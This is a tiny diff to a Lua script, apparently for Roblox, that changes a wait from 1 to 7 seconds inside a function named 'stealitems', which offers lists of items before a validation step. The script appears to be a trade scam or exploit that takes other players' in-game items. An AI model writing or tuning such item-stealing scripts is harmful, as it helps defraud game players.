@@ -532,7 +532,7 @@ local function stealitems()
     offerAll(uncommonItems)
     offerAll(commonItems)
 
-    task.wait(1)
+    task.wait(7)
 
     -- Première validation
     pcall(function()
